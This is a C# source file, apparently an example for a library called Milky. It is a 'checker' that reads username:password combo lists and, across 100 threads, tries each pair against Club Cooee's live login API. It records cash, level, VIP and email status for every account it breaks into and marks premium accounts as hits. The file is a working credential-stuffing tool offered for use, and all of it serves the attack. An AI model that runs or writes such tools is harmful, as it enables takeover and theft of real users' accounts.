using Milky.Enums;
using Milky.Models;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.IO;
using System.Net.Http;
using System.Threading.Tasks;

namespace Milky.Examples
{
    class Club_Cooee_Checker
    {
        static async Task Main()
        {
            var combos = new List<Combo>();

            foreach(string combo in File.ReadAllLines("combos.txt"))
            {
                string[] comboParts = combo.Split(':');

                if(!(comboParts.Length < 2))
                {
                    combos.Add(new Combo
                    {
                        Username = comboParts[0],
                        Password = comboParts[1]
                    });
                }
            }

            var check = new MilkyCheck()
                .WithCombos(combos)
                .WithArgs(new object[]
                {
                    new HttpClient()
                })
                .WithSettings(new CheckSettings
                {
                    Threads = 100,
                    OutputInvalids = false
                })
                .WithCheckingProcess(async (combo, proxy, args) =>
                {
                    var httpClient = (HttpClient)args[0];

                    var result = CheckResult.Unknown;
                    Dictionary<string, string> captures = null;

                    while(result == CheckResult.Unknown)
                    {
                        try
                        {
                            using var requestMessage = new HttpRequestMessage(HttpMethod.Post, "https://en.clubcooee.com/api3/auth_login")
                            {
                                Content = new FormUrlEncodedContent(new Dictionary<string, string>
                                {
                                    { "username", combo.Username },
                                    { "password", combo.Password }
                                })
                            };

                            var responseMessage = await httpClient.SendAsync(requestMessage);

                            var content = await responseMessage.Content.ReadAsStringAsync();
                            var jsonContent = JsonConvert.DeserializeObject<dynamic>(content);

                            if (!(bool)jsonContent.error)
                            {
                                dynamic user = jsonContent.msg.userdata.auth;

                                captures = new Dictionary<string, string>
                                {
                                    { "Cash", (string)user.credits },
                                    { "Level", ((int)user.xp_level).ToString() },
                                    { "VIP", ((bool)user.premium).ToString() },
                                    { "Email confirmed", ((bool)user.email_confirmed).ToString() }
                                };

                                result = (bool)user.premium ? CheckResult.Hit : CheckResult.Free;
                            }
                            else
                            {
                                result = CheckResult.Invalid;
                            }
                        }
                        catch { }
                    }

                    return (result, captures);
                });

            var console = new MilkyConsole()
                .WithCheck(check)
                .WithMeta(new Meta
                {
                    Name = "Club Cooee Checker",
                    Version = "1.0.0",
                    Author = "Laiteux"
                })
                .WithSettings(new ConsoleSettings
                {
                    ShowFree = true,
                    ShowPercentages = true
                })
                .WithRefreshDelay(TimeSpan.FromMilliseconds(100));

            console.Start();
            await check.StartAsync();

            await Task.Delay(-1);
        }
    }
}
